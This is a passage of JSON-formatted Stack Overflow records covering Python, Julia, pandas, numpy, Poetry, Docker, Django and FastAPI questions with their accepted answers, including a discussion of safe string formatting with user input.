    "Body": "I can use the normal F2 rename variable functionality in regular python files in vscode. But not when editing python in a jupyter notebook.\nWhen I press F2 on a variable in a jupyter notebook in vscode I get the familiar change variable window but when I press enter the variable is not changed and I get this error message:\n\nNo result. No result.\n\nIs there a way to get the F2 change variable functionality to work in jupyter notebooks?\nHere's my system info:\njupyter module version\n(adventofcode) C:\\git\\leetcode>pip show jupyter\nName: jupyter\nVersion: 1.0.0\nSummary: Jupyter metapackage. Install all the Jupyter components in one go.\nHome-page: http://jupyter.org\nAuthor: Jupyter Development Team\nAuthor-email: jupyter@googlegroups.org\nLicense: BSD\nLocation: c:\\users\\johan\\anaconda3\\envs\\adventofcode\\lib\\site-packages\nRequires: ipykernel, qtconsole, nbconvert, jupyter-console, notebook, ipywidgets\nRequired-by:\n\nPython version:\n(adventofcode) C:\\git\\leetcode>python --version\nPython 3.10.0\n\nvscode version:\n1.63.2 (user setup)\n\nvscode Jupyter extension version (from the changelog in the extensions window):\n2021.11.100 (November Release on 8 December 2021)\n\n",
    "AcceptedAnswerId": 70736000,
    "AcceptedAnswer": "Notice that you put up a bug report in GitHub and see this issue: Renaming variables didn't work, the programmer replied:\n\nSome language features are currently not supported in notebooks, but\nwe are making plans now to hopefully bring more of those online soon.\n\nSo please wait for this feature.\n"
}
{
    "Id": 70766215,
    "PostTypeId": 1,
    "Title": "Problem with memory allocation in Julia code",
    "Body": "I used a function in Python/Numpy to solve a problem in combinatorial game theory.\nimport numpy as np\nfrom time import time\n\ndef problem(c):\n    start = time()\n    N = np.array([0, 0])\n    U = np.arange(c)\n    \n    for _ in U:\n        bits = np.bitwise_xor(N[:-1], N[-2::-1])\n        N = np.append(N, np.setdiff1d(U, bits).min())\n\n    return len(*np.where(N==0)), time()-start \n\nproblem(10000)\n\nThen I wrote it in Julia because I thought it'd be faster due to Julia using just-in-time compilation.\nfunction problem(c)\n    N = [0]\n    U = Vector(0:c)\n    \n    for _ in U\n        elems = N[1:length(N)-1]\n        bits = elems .\u22bb reverse(elems)\n        push!(N, minimum(setdiff(U, bits))) \n    end\n    \n    return sum(N .== 0)\nend\n\n@time problem(10000)\n\nBut the second version was much slower. For c = 10000, the Python version takes 2.5 sec. on an Core i5 processor and the Julia version takes 4.5 sec. Since Numpy operations are implemented in C, I'm wondering if Python is indeed faster or if I'm writing a function with wasted time complexity.\nThe implementation in Julia allocates a lot of memory. How to reduce the number of allocations to improve its performance?\n",
    "AcceptedAnswerId": 70766903,
    "AcceptedAnswer": "The original code can be re-written in the following way:\nfunction problem2(c)\n    N = zeros(Int, c+2)\n    notseen = falses(c+1)\n\n    for lN in 1:c+1\n        notseen .= true\n        @inbounds for i in 1:lN-1\n            b = N[i] \u22bb N[lN-i]\n            b <= c && (notseen[b+1] = false)\n        end\n        idx = findfirst(notseen)\n        isnothing(idx) || (N[lN+1] = idx-1)\n    end\n    return count(==(0), N)\nend\n\nFirst check if the functions produce the same results:\njulia> problem(10000), problem2(10000)\n(1475, 1475)\n\n(I have also checked that the generated N vector is identical)\nNow let us benchmark both functions:\njulia> using BenchmarkTools\n\njulia> @btime problem(10000)\n  4.938 s (163884 allocations: 3.25 GiB)\n1475\n\njulia> @btime problem2(10000)\n  76.275 ms (4 allocations: 79.59 KiB)\n1475\n\nSo it turns out to be over 60x faster.\nWhat I do to improve the performance is avoiding allocations. In Julia it is easy and efficient. If any part of the code is not clear please comment. Note that I concentrated on showing how to improve the performance of Julia code (and not trying to just replicate the Python code, since - as it was commented under the original post - doing language performance comparisons is very tricky). I think it is better to concentrate in this discussion on how to make Julia code fast.\n\nEDIT\nIndeed changing to Vector{Bool} and removing the condition on b and c relation (which mathematically holds for these values of c) gives a better speed:\njulia> function problem3(c)\n           N = zeros(Int, c+2)\n           notseen = Vector{Bool}(undef, c+1)\n\n           for lN in 1:c+1\n               notseen .= true\n               @inbounds for i in 1:lN-1\n                   b = N[i] \u22bb N[lN-i]\n                   notseen[b+1] = false\n               end\n               idx = findfirst(notseen)\n               isnothing(idx) || (N[lN+1] = idx-1)\n           end\n           return count(==(0), N)\n       end\nproblem3 (generic function with 1 method)\n\njulia> @btime problem3(10000)\n  20.714 ms (3 allocations: 88.17 KiB)\n1475\n\n"
}
{
    "Id": 70739858,
    "PostTypeId": 1,
    "Title": "How to create a brand new virtual environment or duplicate an existing one in poetry? (Multiple environment in a project)",
    "Body": "I have a project and an existing virtual environment created with poetry (poetry install/init).\nSo, as far as I know, the purpouse of a virtual environment is avoiding to modify the system base environment and the possibility of isolation (per project, per development, per system etc...).\nHow can I create another brand new environment for my project in poetry? How can I eventually duplicate and use an existing one?\nI mean that the current one (activated) should be not involved in this (except for eventually copying it) because I want to test another set of dependencies and code.\nI am aware of this:\n\nhttps://github.com/python-poetry/poetry/issues/4055 (answer is not clear and ticket is not closed)\nhttps://python-poetry.org/docs/managing-environments/ (use command seems not to work in the requested way)\n\n",
    "AcceptedAnswerId": 70767511,
    "AcceptedAnswer": "Poetry seems to be bound to one virtualenv per python interpreter.\nPoetry is also bound to the pyproject.toml file and its path to generate a new environment.\nSo there are 2 tricky solutions:\n1 - change your deps in the pyproject.toml and use another python version (installed for example with pyenv) and then:\npoetry env use X.Y\n\npoetry will create a new virtual environment but this is not exactly the same as changing just some project deps.\n2 - use another pyproject.toml from another path:\nmkdir env_test\ncp pyproject.toml env_test/pyproject.toml\ncd env_test\nnano pyproject.toml # edit your dependencies\npoetry install # creates a brand new virtual environment\npoetry shell\n# run your script with the new environment\n\nThis will generate a new environment with just the asked dependencies changed. Both environments can be used at the same time.\nAfter the test, it is eventually possible to delete the new environment with the env command.\n"
}
{
    "Id": 70704285,
    "PostTypeId": 1,
    "Title": "Can no longer fold python dictionaries in VS Code",
    "Body": "I used to be able to collapse (fold) python dictionaries just fine in my VS Code.  Randomly I am not able to do that anymore.  I can still fold classes and functions just fine, but dictionaries cannot fold, the arrow on the left hand side just isn't there.  I've checked my settings but I can't figure out what would've changed.  I'm not sure the best forum to go to for help, so I'm hoping this is ok.  Any ideas?\n",
    "AcceptedAnswerId": 70714478,
    "AcceptedAnswer": "It's caused by Pylance v2022.1.1. Use v2022.1.0 instead.\nIssue #2248\n"
}
{
    "Id": 71198478,
    "PostTypeId": 1,
    "Title": "Counting all combinations of values in multiple columns",
    "Body": "The following is an example of items rated by 1,2 or 3 stars.\nI am trying to count all combinations of item ratings (stars) per month.\nIn the following example, item 10 was rated in month 1 and has two ratings equal 1, one rating equal 2 and one rating equal 3.\ninp = pd.DataFrame({'month':[1,1,1,1,1,2,2,2], \n                    'item':[10,10,10,10,20,20,20,20], \n                    'star':[1,2,1,3,3,2,2,3]}\n                  )\n\n month item star\n0   1   10  1\n1   1   10  2\n2   1   10  1\n3   1   10  3\n4   1   20  3\n5   2   20  2\n6   2   20  2\n7   2   20  3\n\nFor the given above input frame output should be:\n   month    item    star_1_cnt  star_2_cnt  star_3_cnt\n0   1       10      2           1           1\n1   1       20      0           0           1\n2   2       20      0           2           1\n\nI am trying to solve the problem starting with the following code,\nwhich result still needs to be converted to the desired format of the output frame and which gives the wrong answers:\n1   20  3   (1, 1)\n2   20  3   (1, 1)\n\nAnyway, there should be a better way to create the output table, then finalizing this one:\nmonths = [1,2]\nitems = [10,20]\nstars = [1,2,3]\n\nd = {'month': [], 'item': [], 'star': [], 'star_cnts': [] }\n\nfor month in months:\n    for star in stars:\n        for item in items:\n            star_cnts=dict(inp[(inp['item']==item) & (inp['star']==star)].value_counts()).values()\n            d['month'].append(month)\n            d['item'].append(item)\n            d['star'].append(star)\n            d['star_cnts'].append(star_cnts)\n            \npd.DataFrame(d)\n\n    month   item    star    star_cnts\n0   1       10      1       (2)\n1   1       20      1       ()\n2   1       10      2       (1)\n3   1       20      2       (2)\n4   1       10      3       (1)\n5   1       20      3       (1, 1)\n6   2       10      1       (2)\n7   2       20      1       ()\n8   2       10      2       (1)\n9   2       20      2       (2)\n10  2       10      3       (1)\n11  2       20      3       (1, 1)\n\n\u200b\n",
    "AcceptedAnswerId": 71209097,
    "AcceptedAnswer": "This seems like a nice problem for pd.get_dummies:\nnew_df = (\n    pd.concat([df, pd.get_dummies(df['star'])], axis=1)\n    .groupby(['month', 'item'], as_index=False)\n    [df['star'].unique()]\n    .sum()\n)\n\nOutput:\n>>> new_df\n   month  item  1  2  3\n0      1    10  2  1  1\n1      1    20  0  0  1\n2      2    20  0  2  1\n\nRenaming, too:\nu = df['star'].unique()\nnew_df = (\n    pd.concat([df, pd.get_dummies(df['star'])], axis=1)\n    .groupby(['month', 'item'], as_index=False)\n    [u]\n    .sum()\n    .rename({k: f'star_{k}_cnt' for k in df['star'].unique()}, axis=1)\n)\n\nOutput:\n>>> new_df\n   month  item  star_1_cnt  star_2_cnt  star_3_cnt\n0      1    10           2           1           1\n1      1    20           0           0           1\n2      2    20           0           2           1\n\nObligatory one- (or two-) liners:\n# Renames the columns\nu = df['star'].unique()\nnew_df = pd.concat([df, pd.get_dummies(df['star'])], axis=1).groupby(['month', 'item'], as_index=False)[u].sum().rename({k: f'star_{k}_cnt' for k in df['star'].unique()}, axis=1)\n\n"
}
{
    "Id": 70598913,
    "PostTypeId": 1,
    "Title": "Problem resizing plot on tkinter figure canvas",
    "Body": "Python 3.9 on Mac running OS 11.6.1. My application involves placing a plot on a frame inside my root window, and I'm struggling to get the plot to take up a larger portion of the window. I thought rcParams in matplotlib.pyplot would take care of this, but I must be overlooking something.\nHere's what I have so far:\nimport numpy as np\nfrom tkinter import Tk,Frame,TOP,BOTH\n\nimport matplotlib\nfrom matplotlib import pyplot as plt\nfrom matplotlib.backends.backend_tkagg import FigureCanvasTkAgg\n\nplt.rcParams[\"figure.figsize\"] = [18,10]\n\nroot=Tk()\nroot.wm_title(\"Root Window\")\nroot.geometry('1500x1000')\n\nx = np.linspace(0, 2 * np.pi, 400)\ny = np.sin(x ** 2)\nfig, ax = plt.subplots()\nax.plot(x, y)\n\ncanvas_frame=Frame(root) # also tried adjusting size of frame but that didn't help\ncanvas_frame.pack(side=TOP,expand=True)\ncanvas = FigureCanvasTkAgg(fig, master=canvas_frame)\ncanvas.draw()\ncanvas.get_tk_widget().pack(side=TOP,fill=BOTH,expand=True)\n\n\nroot.mainloop()\n\nFor my actual application, I need for canvas to have a frame as its parent and not simply root, which is why canvas_frame is introduced above.\n",
    "AcceptedAnswerId": 70717588,
    "AcceptedAnswer": "try something like this:\nfig.subplots_adjust(left=0.05, bottom=0.07, right=0.95, top=0.95, wspace=0, hspace=0)\n\nthis is output, figure now takes more screen area %\n[\n"
}
{
    "Id": 71225952,
    "PostTypeId": 1,
    "Title": "Try each function of a class with functools.wraps decorator",
    "Body": "I'm trying to define a decorator in order to execute a class method, try it first and, if an error is detected, raise it mentioning the method in which failed, so as to the user could see in which method is the error.\nHere I show a MRE (Minimal, Reproducible Example) of my code.\nfrom functools import wraps\n\ndef trier(func):\n    \"\"\"Decorator for trying A-class methods\"\"\"\n    @wraps(func)\n    def inner_func(self, name, *args):\n        \n        try:\n            func(self, *args)\n        \n        except:\n            print(f\"An error apeared while {name}\")\n    \n    return inner_func\n    \nclass A:\n    def __init__(self):\n        self._animals = 2\n        self._humans = 5\n    \n    @trier('getting animals')\n    def animals(self, num):\n        return self._animals + num\n    \n    @trier('getting humans')\n    def humans(self):\n        return self._humans\n\nA().animals\n\nMany errors are raising, like:\n\nTypeError: inner_func() missing 1 required positional argument: 'name'\n\nor misunderstanding self class with self function.\n",
    "AcceptedAnswerId": 71226219,
    "AcceptedAnswer": "As an alternative to Stefan's answer, the following simply uses @trier without any parameters to decorate functions, and then when printing out the error message we can get the name with func.__name__.\nfrom functools import wraps\n\ndef trier(func):\n    \"\"\"Decorator for trying A-class methods\"\"\"\n    @wraps(func)\n    def inner_func(self, *args, **kwargs):\n\n        try:\n            return func(self, *args, **kwargs)\n\n        except:\n            print(f\"An error apeared in {func.__name__}\")\n\n    return inner_func\n\nclass A:\n    def __init__(self):\n        self._animals = 2\n        self._humans = 5\n\n    @trier\n    def animals(self, num):\n        return self._animals + num\n\n    @trier\n    def humans(self):\n        return self._humans\n\nprint(A().animals(1))\n\nI also fixed a couple of bugs in the code: In trier's try and except the result of calling func was never returned, and you need to include **kwargs in addition to *args so you can use named parameters. I.e. A().animals(num=1) only works when you handle kwargs.\n"
}
{
    "Id": 71225872,
    "PostTypeId": 1,
    "Title": "Why does numpy.view(bool) makes numpy.logical_and significantly faster?",
    "Body": "When passing a numpy.ndarray of uint8 to numpy.logical_and, it runs significantly faster if I apply numpy.view(bool) to its inputs.\na = np.random.randint(0, 255, 1000 * 1000 * 100, dtype=np.uint8)\nb = np.random.randint(0, 255, 1000 * 1000 * 100, dtype=np.uint8)\n\n%timeit np.logical_and(a, b)\n126 ms \u00b1 1.17 ms per loop (mean \u00b1 std. dev. of 7 runs, 10 loops each)\n\n%timeit np.logical_and(a.view(bool), b.view(bool))\n20.9 ms \u00b1 110 \u00b5s per loop (mean \u00b1 std. dev. of 7 runs, 10 loops each)\n\nCan someone explain why this is happening?\nFurthermore, why numpy.logical_and doesn't automatically apply view(bool) to an array of uint8? (Is there any situation where we shouldn't use view(bool)?)\nEDIT:\nIt seems that this is an issue with Windows environment.\nI just tried the same thing in the official python docker container (which is debian) and found no difference between them.\nMy environment:\n\nOS: Windows 10 Pro 21H2\nCPU: AMD Ryzen 9 5900X\nPython: Python 3.10.2 (tags/v3.10.2:a58ebcc, Jan 17 2022, 14:12:15) [MSC v.1929 64 bit (AMD64)] on win32\nnumpy: 1.22.2\n\n",
    "AcceptedAnswerId": 71227844,
    "AcceptedAnswer": "This is a performance issue of the current Numpy implementation. I can also reproduce this problem on Windows (using an Intel Skylake Xeon processor with Numpy 1.20.3). np.logical_and(a, b) executes a very-inefficient scalar assembly code based on slow conditional jumps while np.logical_and(a.view(bool), b.view(bool)) executes relatively-fast SIMD instructions.\nCurrently, Numpy uses a specific implementation for bool-types. Regarding the compiler used, the general-purpose implementation can be significantly slower if the compiler used to build Numpy failed to automatically vectorize the code which is apparently the case on Windows (and explain why this is not the case on other platforms since the compiler is likely not exactly the same). The Numpy code can be improved for non-bool types. Note that the vectorization of Numpy is an ongoing work and we plan optimize this soon.\n\nDeeper analysis\nHere is the assembly code executed by np.logical_and(a, b):\nBlock 24:                         \n    cmp byte ptr [r8], 0x0        ; Read a[i]\n    jz                  ; Jump to block 27 if a[i]!=0\nBlock 25:                         \n    cmp byte ptr [r9], 0x0        ; Read b[i]\n    jz                  ; Jump to block 27 if b[i]!=0\nBlock 26:                         \n    mov al, 0x1                   ; al = 1\n    jmp                 ; Skip the next instruction\nBlock 27:                         \n    xor al, al                    ; al = 0\nBlock 28:                         \n    mov byte ptr [rdx], al        ; result[i] = al\n    inc r8                        ; i += 1\n    inc rdx                       \n    inc r9                        \n    sub rcx, 0x1                  \n    jnz                 ; Loop again while i<a.shape[0]\n\nAs you can see, the loop use several data-dependent conditional jumps to write per item of a and b read. This is very inefficient here since the branch taken cannot be predicted by the processor with random values. As a result the processor stall for few cycles (typically about 10 cycles on modern x86 processors).\nHere is the assembly code executed by np.logical_and(a.view(bool), b.view(bool)):\nBlock 15:\n    movdqu xmm1, xmmword ptr [r10]               ; xmm1 = a[i:i+16]\n    movdqu xmm0, xmmword ptr [rbx+r10*1]         ; xmm0 = b[i:i+16]\n    lea r10, ptr [r10+0x10]                      ; i += 16\n    pcmpeqb xmm1, xmm2                           ; \\\n    pandn xmm1, xmm0                             ;  | Complex sequence to just do:\n    pcmpeqb xmm1, xmm2                           ;  | xmm1 &= xmm0\n    pandn xmm1, xmm3                             ; /\n    movdqu xmmword ptr [r14+r10*1-0x10], xmm1    ; result[i:i+16] = xmm1\n    sub rcx, 0x1                                 \n    jnz                                ; Loop again while i!=a.shape[0]//16\n\nThis code use the SIMD instruction set called SSE which is able to work on 128-bit wide registers. There is no conditional jumps. This code is far more efficient as it operates on 16 items at once per iteration and each iteration should be much faster.\nNote that this last code is not optimal either as most modern x86 processors (like your AMD one) supports the 256-bit AVX-2 instruction set (twice as fast). Moreover, the compiler generate an inefficient sequence of SIMD instruction to perform the logical-and that can be optimized. The compiler seems to assume the boolean can be values different of 0 or 1. That being said, the input arrays are too big to fit in your CPU cache and so the code is bounded by the throughput of your RAM as opposed to the first one. This is why the SIMD-friendly code is not drastically faster. The difference between the two version is certainly much bigger with arrays of less than 1 MiB on your processor (like on almost all other modern processor).\n"
}
{
    "Id": 70751249,
    "PostTypeId": 1,
    "Title": "Which are safe methods and practices for string formatting with user input in Python 3?",
    "Body": "My Understanding\nFrom various sources, I have come to the understanding that there are four main techniques of string formatting/interpolation in Python 3 (3.6+ for f-strings):\n\nFormatting with %, which is similar to C's printf\nThe str.format() method\nFormatted string literals/f-strings\nTemplate strings from the standard library string module\n\nMy knowledge of usage mainly comes from Python String Formatting Best Practices (source A):\n\nstr.format() was created as a better alternative to the %-style, so the latter is now obsolete\n\nHowever, str.format() is vulnerable to attacks if user-given format strings are not properly handled\n\n\nf-strings allow str.format()-like behavior only for string literals but are shorter to write and are actually somewhat-optimized syntactic sugar for concatenation\nTemplate strings are safer than str.format() (demonstrated in the first source) and the other two methods (implied in the first source) when dealing with user input\n\nI understand that the aforementioned vulnerability in str.format() comes from the method being usable on any normal strings where the delimiting braces are part of the string data itself. Malicious user input containing brace-delimited replacement fields can be supplied to the method to access environment attributes. I believe this is unlike the other ways of formatting where the programmer is the only one that can supply variables to the pre-formatted string. For example, f-strings have similar syntax to str.format() but, because f-strings are literals and the inserted values are evaluated separately through concatenation-like behavior, they are not vulnerable to the same attack (source B). Both %-formatting and Template strings also seem to only be supplied variables for substitution by the programmer; the main difference pointed out is Template's more limited functionality.\nMy Confusion\nI have seen a lot of emphasis on the vulnerability of str.format() which leaves me with questions of what I should be wary of when using the other techniques. Source A describes Template strings as the safest of the above methods \"due to their reduced complexity\":\n\nThe more complex formatting mini-languages of the other string formatting techniques might introduce security vulnerabilities to your programs.\n\n\nYes, it seems like f-strings are not vulnerable in the same way str.format() is, but are there known concerns about f-string security as is implied by source A? Is the concern more like risk mitigation for unknown exploits and unintended interactions?\n\nI am not familiar with C and I don't plan on using the clunkier %/printf-style formatting, but I have heard that C's printf had its own potential vulnerabilities. In addition, both sources A and B seem to imply a lack of security with this method. The top answer in Source B says,\n\nString formatting may be dangerous when a format string depends on untrusted data. So, when using str.format() or %-formatting, it's important to use static format strings, or to sanitize untrusted parts before applying the formatter function.\n\n\nDo %-style strings have known security concerns?\nLastly, which methods should be used and how can user input-based attacks be prevented (e.g. filtering input with regex)?\n\nMore specifically, are Template strings really the safer option? and Can f-strings be used just as easily and safely while granting more functionality?\n\n\n\n",
    "AcceptedAnswerId": 70755916,
    "AcceptedAnswer": "It doesn't matter which format you choose, any format and library can have its own downsides and vulnerabilities. The bigger questions you need to ask yourself is what is the risk factor and the scenario you are facing with, and what are you going to do about it.\nFirst ask yourself: will there be a scenario where a user or an external entity of some kind (for example - an external system) sends you a format string? If the answer is no, there is no risk. If the answer is yes, you need to see whether this is needed or not. If not - remove it to eliminate the risk.\nIf you need it - you can perform whitelist-based input validation and exclude all format-specific special characters from the list of permitted characters, in order to eliminate the risk. For example, no format string can pass the ^[a-zA-Z0-9\\s]*$ generic regular expression.\nSo the bottom line is: it doesn't matter which format string type you use, what's really important is what do you do with it and how can you reduce and eliminate the risk of it being tampered.\n"
}
{
    "Id": 70773526,
    "PostTypeId": 1,
    "Title": "Why do we need a dict.update() method in python instead of just assigning the values to the corresponding keys?",
    "Body": "I have been working with dictionaries that I have to modify within different parts of my code. I am trying to make sure if I do not miss anything about there is no need for dict_update() in any scenario.\nSo the reasons to use update() method is either to add a new key-value pair to current dictionary, or update the value of your existing ones.\nBut wait!?\nAren't they already possible by just doing:\n>>>test_dict = {'1':11,'2':1445}\n>>>test_dict['1'] = 645\n>>>test_dict\n{'1': 645, '2': 1445}\n>>>test_dict[5]=123\n>>>test_dict\n{'1': 645, '2': 1445, 5: 123}\n\nIn what case it would be crucial to use it ? I am curious.\nMany thanks\n",
    "AcceptedAnswerId": 70773868,
    "AcceptedAnswer": "1. You can update many keys on the same statement.\nmy_dict.update(other_dict)\n\nIn this case you don't have to know how many keys are in the other_dict. You'll just be sure that all of them will be updated on my_dict.\n2. You can use any iterable of key/value pairs with dict.update\nAs per the documentation you can use another dictionary, kwargs, list of tuples, or even generators that yield tuples of len 2.\n3. You can use the update method as an argument for functions that expect a function argument.\nExample:\ndef update_value(key, value, update_function):\n    update_function([(key, value)])\n\nupdate_value(\"k\", 3, update_on_the_db)  # suppose you have a update_on_the_db function\nupdate_value(\"k\", 3, my_dict.update)  # this will update on the dict\n\n"
}
{
    "Id": 71238822,
    "PostTypeId": 1,
    "Title": "Why is setuptools not available in environment Ubuntu docker image with Python & dev tools installed?",
    "Body": "I'm trying to build a Ubuntu 18.04 Docker image running Python 3.7 for a machine learning project. When installing specific Python packages with pip from requirements.txt, I get the following error:\nCollecting sklearn==0.0\n  Downloading sklearn-0.0.tar.gz (1.1 kB)\n  Preparing metadata (setup.py): started\n  Preparing metadata (setup.py): finished with status 'error'\n  error: subprocess-exited-with-error\n  \n  \u00d7 python setup.py egg_info did not run successfully.\n  \u2502 exit code: 1\n  \u2570\u2500> [1 lines of output]\n      ERROR: Can not execute `setup.py` since setuptools is not available in the build environment.\n      [end of output]\n\nAlthough here the error arises in the context of sklearn, the issue is not specific to one library; when I remove that libraries and try to rebuild the image, the error arises with other libraries.\nHere is my Dockerfile:\nFROM ubuntu:18.04\n\n# install python\nRUN apt-get update && \\\n    apt-get install --no-install-recommends -y \\\n    python3.7 python3-pip python3.7-dev\n\n# copy requirements\nWORKDIR /opt/program\nCOPY requirements.txt requirements.txt\n\n# install requirements\nRUN python3.7 -m pip install --upgrade pip && \\\n    python3.7 -m pip install -r requirements.txt\n\n# set up program in image\nCOPY . /opt/program\n\nWhat I've tried:\n\ninstalling python-devtools, both instead of and alongside, python3.7-dev before installing requirements with pip;\ninstalling setuptools in requirements.txt before affected libraries are installed.\n\nIn both cases the same error arose.\nDo you know how I can ensure setuptools is available in my environment when installing libraries like sklearn?\n",
    "AcceptedAnswerId": 71239956,
    "AcceptedAnswer": "As mentioned in comment, install setuptools with pip before running pip install -r requirements.txt.\nIt is different than putting setuptools higher in the requirements.txt because it forces the order while the requirements file collect all the packages and installs them after so you don't control the order.\n"
}
{
    "Id": 70658151,
    "PostTypeId": 1,
    "Title": "How to log production database changes made via the Django shell",
    "Body": "I would like to automatically generate some sort of log of all the database changes that are made via the Django shell in the production environment.\nWe use schema and data migration scripts to alter the production database and they are version controlled. Therefore if we introduce a bug, it's easy to track it back. But if a developer in the team changes the database via the Django shell which then introduces an issue, at the moment we can only hope that they remember what they did or/and we can find their commands in the Python shell history.\nExample. Let's imagine that the following code was executed by a developer in the team via the Python shell:\n>>> tm = TeamMembership.objects.get(person=alice)\n>>> tm.end_date = date(2022,1,1)\n>>> tm.save()\n\nIt changes a team membership object in the database. I would like to log this somehow.\nI'm aware that there are a bunch of Django packages related to audit logging, but I'm only interested in the changes that are triggered from the Django shell, and I want to log the Python code that updated the data.\nSo the questions I have in mind:\n\nI can log the statements from IPython but how do I know which one touched the database?\nI can listen to the pre_save signal for all model to know if data changes, but how do I know if the source was from the Python shell? How do I know what was the original Python statement?\n\n",
    "AcceptedAnswerId": 70791300,
    "AcceptedAnswer": "This solution logs all commands in the session if any database changes were made.\nHow to detect database changes\nWrap execute_sql of SQLInsertCompiler, SQLUpdateCompiler and SQLDeleteCompiler.\nSQLDeleteCompiler.execute_sql returns a cursor wrapper.\nfrom django.db.models.sql.compiler import SQLInsertCompiler, SQLUpdateCompiler, SQLDeleteCompiler\n\nchanged = False\n\ndef check_changed(func):\n    def _func(*args, **kwargs):\n        nonlocal changed\n        result = func(*args, **kwargs)\n        if not changed and result:\n            changed = not hasattr(result, 'cursor') or bool(result.cursor.rowcount)\n        return result\n    return _func\n\nSQLInsertCompiler.execute_sql = check_changed(SQLInsertCompiler.execute_sql)\nSQLUpdateCompiler.execute_sql = check_changed(SQLUpdateCompiler.execute_sql)\nSQLDeleteCompiler.execute_sql = check_changed(SQLDeleteCompiler.execute_sql)\n\nHow to log commands made via the Django shell\natexit.register() an exit handler that does readline.write_history_file().\nimport atexit\nimport readline\n\ndef exit_handler():\n    filename = 'history.py'\n    readline.write_history_file(filename)\n\natexit.register(exit_handler)\n\nIPython\nCheck whether IPython was used by comparing HistoryAccessor.get_last_session_id().\nimport atexit\nimport io\nimport readline\n\nipython_last_session_id = None\ntry:\n    from IPython.core.history import HistoryAccessor\nexcept ImportError:\n    pass\nelse:\n    ha = HistoryAccessor()\n    ipython_last_session_id = ha.get_last_session_id()\n\ndef exit_handler():\n    filename = 'history.py'\n    if ipython_last_session_id and ipython_last_session_id != ha.get_last_session_id():\n        cmds = '\\n'.join(cmd for _, _, cmd in ha.get_range(ha.get_last_session_id()))\n        with io.open(filename, 'a', encoding='utf-8') as f:\n            f.write(cmds)\n            f.write('\\n')\n    else:\n        readline.write_history_file(filename)\n\natexit.register(exit_handler)\n\nPut it all together\nAdd the following in manage.py before execute_from_command_line(sys.argv).\nif sys.argv[1] == 'shell':\n    import atexit\n    import io\n    import readline\n\n    from django.db.models.sql.compiler import SQLInsertCompiler, SQLUpdateCompiler, SQLDeleteCompiler\n\n    changed = False\n\n    def check_changed(func):\n        def _func(*args, **kwargs):\n            nonlocal changed\n            result = func(*args, **kwargs)\n            if not changed and result:\n                changed = not hasattr(result, 'cursor') or bool(result.cursor.rowcount)\n            return result\n        return _func\n\n    SQLInsertCompiler.execute_sql = check_changed(SQLInsertCompiler.execute_sql)\n    SQLUpdateCompiler.execute_sql = check_changed(SQLUpdateCompiler.execute_sql)\n    SQLDeleteCompiler.execute_sql = check_changed(SQLDeleteCompiler.execute_sql)\n\n    ipython_last_session_id = None\n    try:\n        from IPython.core.history import HistoryAccessor\n    except ImportError:\n        pass\n    else:\n        ha = HistoryAccessor()\n        ipython_last_session_id = ha.get_last_session_id()\n\n    def exit_handler():\n        if changed:\n            filename = 'history.py'\n            if ipython_last_session_id and ipython_last_session_id != ha.get_last_session_id():\n                cmds = '\\n'.join(cmd for _, _, cmd in ha.get_range(ha.get_last_session_id()))\n                with io.open(filename, 'a', encoding='utf-8') as f:\n                    f.write(cmds)\n                    f.write('\\n')\n            else:\n                readline.write_history_file(filename)\n\n    atexit.register(exit_handler)\n\n"
}
{
    "Id": 70773879,
    "PostTypeId": 1,
    "Title": "fastapi (starlette) RedirectResponse redirect to post instead get method",
    "Body": "I have encountered strange redirect behaviour after returning a RedirectResponse object\nevents.py\nrouter = APIRouter()\n\n@router.post('/create', response_model=EventBase)\nasync def event_create(\n        request: Request,\n        user_id: str = Depends(get_current_user),\n        service: EventsService = Depends(),\n        form: EventForm = Depends(EventForm.as_form)\n):\n    event = await service.post(\n       ...\n   )\n    redirect_url = request.url_for('get_event', **{'pk': event['id']})\n    return RedirectResponse(redirect_url)\n\n\n@router.get('/{pk}', response_model=EventSingle)\nasync def get_event(\n        request: Request,\n        pk: int,\n        service: EventsService = Depends()\n):\n    ....some logic....\n    return templates.TemplateResponse(\n        'event.html',\n        context=\n        {\n            ...\n        }\n    )\n\nrouters.py\napi_router = APIRouter()\n\n...\napi_router.include_router(events.router, prefix=\"/event\")\n\nthis code returns the result\n127.0.0.1:37772 - \"POST /event/22 HTTP/1.1\" 405 Method Not Allowed\n\nOK, I see that for some reason a POST request is called instead of a GET request. I search for an explanation and find that the RedirectResponse object defaults to code 307 and calls POST link\nI follow the advice and add a status\nredirect_url = request.url_for('get_event', **{'pk': event['id']}, status_code=status.HTTP_302_FOUND)\n\nAnd get\nstarlette.routing.NoMatchFound\n\nfor the experiment, I'm changing @router.get('/{pk}', response_model=EventSingle) to @router.post('/{pk}', response_model=EventSingle)\nand the redirect completes successfully, but the post request doesn't suit me here. What am I doing wrong?\nUPD\nhtml form for running event/create logic\nbase.html\n\n...\n\n\nbase_view.py\n@router.get('/', response_class=HTMLResponse)\nasync def main_page(request: Request,\n                    activity_service: ActivityService = Depends()):\n    activity = await activity_service.get()\n    return templates.TemplateResponse('base.html', context={'request': request,\n                                                            'activities': activity})\n\n",
    "AcceptedAnswerId": 70774192,
    "AcceptedAnswer": "When you want to redirect to a GET after a POST, the best practice is to redirect with a 303 status code, so just update your code to:\n    # ...\n    return RedirectResponse(redirect_url, status_code=303)\n\nAs you've noticed, redirecting with 307 keeps the HTTP method and body.\nFully working example:\nfrom fastapi import FastAPI, APIRouter, Request\nfrom fastapi.responses import RedirectResponse, HTMLResponse\n\n\nrouter = APIRouter()\n\n@router.get('/form')\ndef form():\n    return HTMLResponse(\"\"\"\n    \n    \n    Send request\n    \n    \n    \"\"\")\n\n@router.post('/create')\nasync def event_create(\n        request: Request\n):\n    event = {\"id\": 123}\n    redirect_url = request.url_for('get_event', **{'pk': event['id']})\n    return RedirectResponse(redirect_url, status_code=303)\n\n\n@router.get('/{pk}')\nasync def get_event(\n        request: Request,\n        pk: int,\n):\n    return f'oi pk={pk}'\n\napp = FastAPI(title='Test API')\n\napp.include_router(router, prefix=\"/event\")\n\nTo run, install pip install fastapi uvicorn and run with:\nuvicorn --reload --host 0.0.0.0 --port 3000 example:app\n\nThen, point your browser to: http://localhost:3000/event/form\n"
}
{
    "Id": 71324949,
    "PostTypeId": 1,
    "Title": "Import \"selenium\" could not be resolved Pylance (reportMissingImports)",
